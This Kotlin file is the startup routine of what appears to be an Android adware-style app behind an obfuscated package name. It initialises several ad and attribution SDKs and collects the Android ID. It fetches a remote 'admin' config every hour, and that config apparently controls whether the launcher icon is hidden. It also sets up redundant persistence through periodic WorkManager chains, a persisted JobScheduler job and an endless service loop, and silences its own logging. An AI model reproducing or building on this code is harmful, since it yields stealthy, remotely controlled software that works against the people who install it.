package com.even.zining.inherit.sound.start

import android.annotation.SuppressLint
import android.app.Application
import android.app.Application.getProcessName
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.webkit.WebView
import androidx.core.app.FnnJobIntentService
import androidx.work.Configuration
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.appsflyer.AFAdRevenueData
import com.appsflyer.AFLogger
import com.appsflyer.AdRevenueScheme
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.MediationNetwork
import com.bytedance.sdk.openadsdk.api.init.PAGConfig
import com.bytedance.sdk.openadsdk.api.init.PAGSdk
import com.bytedance.sdk.openadsdk.api.init.PAGSdk.PAGInitCallback
import com.even.zining.inherit.sound.pangle.AdXian
import com.even.zining.inherit.sound.pangle.AdLim
import com.even.zining.inherit.sound.tool.data.FnnBean
import com.even.zining.inherit.sound.job.sjob.FnnJobService
import com.even.zining.inherit.sound.job.workjob.JustWorker
import com.even.zining.inherit.sound.job.workjob.QuanWorker
import com.even.zining.inherit.sound.tool.TbaPostTool
import com.even.zining.inherit.sound.tool.data.FnnLoadData
import com.even.zining.inherit.sound.tool.data.MMKVUtils
import com.even.zining.inherit.sound.tool.PngCanGo
import com.even.zining.inherit.sound.tool.NetPostTool
import com.even.zining.inherit.sound.zeros.FnnLoad
import com.even.zining.inherit.sound.znet.lo.FnnA
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.messaging.messaging
import com.google.gson.Gson
import com.tencent.mmkv.MMKV
import com.thinkup.core.api.TUSDK
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.math.abs


object FnnStartFun {
    lateinit var mainStart: Application
    var mustXS: Boolean = true
    val adLimiter = AdLim()
    var adShowTime: Long = 0
    var showAdTime: Long = 0

    fun init(application: Application, mustXSData: Boolean) {
        MMKV.initialize(application)
        if (PngCanGo.isMainProcess(application)) {
            showLog(" MainStart init")
            mainStart = application
            mustXS = mustXSData
            FirebaseApp.initializeApp(application)
            val lifecycleObserver = LifeServiceShow()
            application.registerActivityLifecycleCallbacks(lifecycleObserver)
            WorkManager.initialize(application, Configuration.Builder().build())
            initSDKData()
            PngCanGo.startService()
            getAndroidId()
            noShowICCC()
            launchRefData()
            TbaPostTool.sessionUp()
            initAppsFlyer()
            getFcmFun()
            enqueuePeriodicChain()
            enqueueSelfLoop()
            schedulePeriodicJob()
            startJobIntServiceFun()
        } else {
            runCatching {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    val processName = getProcessName() ?: "default"
                    WebView.setDataDirectorySuffix(processName)
                }
            }
        }
    }

    @SuppressLint("SuspiciousIndentation")
    private fun initSDKData() {
        val path = "${mainStart.applicationContext.dataDir.path}/fnnfl"
        File(path).mkdirs()
        Log.e("TAG", "initSDKData: ${FnnLoadData.getConfig().appidPangle}")
        val pAGInitConfig = PAGConfig.Builder()
            .appId(FnnLoadData.getConfig().appidPangle)
            .build()
        PAGSdk.init(mainStart, pAGInitConfig, object : PAGInitCallback {
            override fun success() {
                Log.e("TAG", "PAGInitCallback new api init success: ")
            }

            override fun fail(code: Int, msg: String) {
                Log.e("TAG", "PAGInitCallback new api init fail: $code")
            }
        })
        TUSDK.init(
            mainStart,
            FnnLoadData.getConfig().appidTopon,
            FnnLoadData.getConfig().appkeyTopon
        )
        Log.e("TAG", "open initSDK: ${FnnLoadData.getConfig().appidTopon}")

        FnnA.IntIn(mainStart)
    }

    @SuppressLint("HardwareIds")
    private fun getAndroidId() {
        val adminData = MMKVUtils.getString(FnnLoadData.appiddata)
        if (adminData.isEmpty()) {
            val androidId =
                Settings.Secure.getString(mainStart.contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrBlank()) {
                MMKVUtils.put(FnnLoadData.appiddata, androidId)
            } else {
                MMKVUtils.put(FnnLoadData.appiddata, UUID.randomUUID().toString())
            }
        }
    }

    private fun launchRefData() {
        val refData = MMKVUtils.getString(FnnLoadData.refdata)
        val intJson = MMKVUtils.getString(FnnLoadData.IS_INT_JSON)
        if (refData.isNotEmpty()) {
            startOneTimeAdminData()
            intJson.takeIf { it.isNotEmpty() }?.let {
                NetPostTool.postInstallData(mainStart)
            }
            return
        }
        showLog("launchRefData=$refData")
        startRefDataCheckLoop()
    }

    private fun startRefDataCheckLoop() {
        CoroutineScope(Dispatchers.IO).launch {
            while (MMKVUtils.getString(FnnLoadData.refdata).isEmpty()) {
                refInformation()
                delay(5000)
            }
        }
    }

    private fun refInformation() {
        runCatching {
            val referrerClient = InstallReferrerClient.newBuilder(mainStart).build()
            referrerClient.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    runCatching {
                        handleReferrerSetup(responseCode, referrerClient)
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {
                }
            })
        }.onFailure { e ->
            showLog("Failed to fetch referrer: ${e.message}")
        }
    }

    private fun handleReferrerSetup(responseCode: Int, referrerClient: InstallReferrerClient) {
        when (responseCode) {
            InstallReferrerClient.InstallReferrerResponse.OK -> {
                val installReferrer = referrerClient.installReferrer.installReferrer
                if (installReferrer.isNotEmpty()) {
                    MMKVUtils.put(FnnLoadData.refdata, installReferrer)
                    NetPostTool.postInstallData(mainStart)
                    startOneTimeAdminData()
                }
                showLog("Referrer  data: ${installReferrer}")
            }

            else -> {
                showLog("Failed to setup referrer: $responseCode")
            }
        }

        kotlin.runCatching {
            referrerClient.endConnection()
        }
    }

    private fun startOneTimeAdminData() {
        val adminData = MMKVUtils.getString(FnnLoadData.admindata)
        showLog("startOneTimeAdminData: $adminData")
        if (adminData.isEmpty()) {
            NetPostTool.onePostAdmin()
        } else {
            NetPostTool.twoPostAdmin()
        }
        //1hours
        scheduleHourlyAdminRequest()
        DataGetUtils.initFaceBook()
    }


    private fun scheduleHourlyAdminRequest() {
        // 协程
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                delay(1000 * 60 * 60)
                showLog("延迟1小时循环请求")
                val result = DataGetUtils.executeAdminRequest()
                if (result.isSuccess) {
                    val value = result.getOrNull()
                    showLog("Admin request successful: $value")
                } else {
                    val exception = result.exceptionOrNull()
                    showLog("Admin request failed: ${exception?.message}")
                }
            }
        }
    }

    fun canIntNextFun() {
        val adScheduler = AdXian()
        adScheduler.startRomFun()
    }

    fun showLog(msg: String) {
        if (mustXS) {
            return
        }
        Log.e("Browser", msg)
    }

    fun getAdminData(): FnnBean? {
//        MMKVUtils.put(FnnLoadData.admindata, FnnLoadData.json_data)
        val adminData = MMKVUtils.getString(FnnLoadData.admindata)
        val adminBean = runCatching {
            Gson().fromJson(adminData, FnnBean::class.java)
        }.getOrNull()
        return if (adminBean != null && isValidAdminBean(adminBean)) {
            adminBean
        } else {
            null
        }
    }

    private fun isValidAdminBean(bean: FnnBean): Boolean {
        return bean.config != null && bean.config.user.isUploader != null &&
                bean.config.scheduler != null && bean.config.identifiers.isNotEmpty()
    }


    fun putAdminData(adminBean: String) {
        MMKVUtils.put(FnnLoadData.admindata,adminBean)
//        MMKVUtils.put(FnnLoadData.admindata, FnnLoadData.json_data)
        DataGetUtils.initFaceBook()
    }

    private fun noShowICCC() {
        CoroutineScope(Dispatchers.Main).launch {
            val isaData = getAdminData()
            if (isaData == null || !isaData.config.user.isUploader.isDigitSumEven()) {
                showLog("不是A方案显示图标")
                FnnLoad.fnnLoad(5567676)
            }
        }
    }

    fun initAppsFlyer() {
        val appsFlyer = AppsFlyerLib.getInstance()
        val appId = MMKVUtils.getString(FnnLoadData.appiddata)
        val context = mainStart
        showLog("AppsFlyer-id: $${FnnLoadData.getConfig().appsId}")
        appsFlyer.init(FnnLoadData.getConfig().appsId, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(conversionDataMap: MutableMap<String, Any>?) {
                val status = conversionDataMap?.get("af_status") as? String ?: "null_status"
                showLog("AppsFlyer: $status")
                TbaPostTool.pointInstallAf(status)

                conversionDataMap?.forEach { (key, value) ->
                    try {
                        showLog("AppsFlyer-all: key=$key: value=$value")
                    } catch (e: Exception) {
                        showLog("AppsFlyer-logError: ${e.localizedMessage}")
                    }
                }
            }

            override fun onConversionDataFail(p0: String?) {
                showLog("AppsFlyer: onConversionDataFail $p0")
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
                showLog("AppsFlyer: onAppOpenAttribution $p0")
            }

            override fun onAttributionFailure(p0: String?) {
                showLog("AppsFlyer: onAttributionFailure $p0")
            }
        }, context)
        AppsFlyerLib.getInstance().setLogLevel(AFLogger.LogLevel.ERROR)
        appsFlyer.setCustomerUserId(appId)
        appsFlyer.start(context)

        appsFlyer.logEvent(
            context,
            "systemsentry_install",
            buildMap {
                put("customer_user_id", appId)
                put("app_version", TbaPostTool.showAppVersion())
                put("os_version", Build.VERSION.RELEASE)
                put("bundle_id", context.packageName)
                put("language", "asc_wds")
                put("platform", "raincoat")
                put("android_id", appId)
            }
        )
    }


    fun getFcmFun() {
        if (!mustXS) return
        if (MMKVUtils.getBoolean(FnnLoadData.fcmState)) return
        runCatching {
            Firebase.messaging.subscribeToTopic(FnnLoadData.fffmmm)
                .addOnSuccessListener {
                    MMKVUtils.put(FnnLoadData.fcmState, true)
                    showLog("Firebase: subscribe success")
                }
                .addOnFailureListener {
                    showLog("Firebase: subscribe fail")
                }
        }
    }

    fun Int?.isDigitSumEven(): Boolean {
        if (this == null) return false

        var n = abs(this)
        var sum = 0

        if (n == 0) return true

        while (n > 0) {
            sum += n % 10
            n /= 10
        }

        return sum % 2 == 0
    }

    private fun enqueuePeriodicChain() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.UNMETERED)
            .setRequiresBatteryNotLow(true)
            .build()

        val periodicWork = PeriodicWorkRequestBuilder<JustWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(mainStart).enqueueUniquePeriodicWork(
            "just_work",
            ExistingPeriodicWorkPolicy.REPLACE,
            periodicWork
        )
    }

    fun enqueueSelfLoop() {
        val work =
            OneTimeWorkRequestBuilder<QuanWorker>().setInitialDelay(2, TimeUnit.MINUTES).build()
        WorkManager.getInstance(mainStart).enqueue(work)
    }

    private fun schedulePeriodicJob() {
        val jobScheduler = mainStart.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        val componentName = ComponentName(mainStart, FnnJobService::class.java)
        val jobInfo = JobInfo.Builder(44778, componentName)
            .setPeriodic(15 * 60 * 1000)
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE)
            .setRequiresCharging(false)
            .setRequiresDeviceIdle(false)
            .setPersisted(true)
            .build()

        val result = jobScheduler.schedule(jobInfo)

        if (result == JobScheduler.RESULT_SUCCESS) {
            Log.d("JobScheduler", "Job scheduled successfully")
        } else {
            Log.e("JobScheduler", "Job scheduling failed")
        }
    }

    private fun startJobIntServiceFun() {
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                val intent = Intent(mainStart, FnnJobIntentService::class.java)
                FnnJobIntentService.enqueueWork(mainStart, intent)
                delay(5 * 60 * 1000)
            }
        }
    }
}